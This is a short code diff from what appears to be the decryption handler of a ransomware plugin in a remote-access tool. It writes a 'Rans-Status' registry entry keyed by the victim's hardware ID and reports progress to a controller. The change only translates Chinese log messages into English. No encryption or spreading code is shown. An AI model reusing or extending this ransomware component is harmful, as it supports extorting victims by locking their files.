@@ -25,13 +25,13 @@ namespace Plugin.Handler
             try
             {
                 Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-Status", "Decryption in progress...");
-                Packet.Log("解密中...");
+                Packet.Log("Decrypting...");
                 System_Driver(Pass);
                 Fix_Drivers(Pass);
                 OtherDrivers(Pass);
                 Thread.Sleep(1000);
                 Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-Status", "Decrypted");
-                Packet.Log(Connection.Hwid + "解密完毕");
+                Packet.Log(Connection.Hwid + "Decrypted");
             }
             catch (Exception ex)
             {
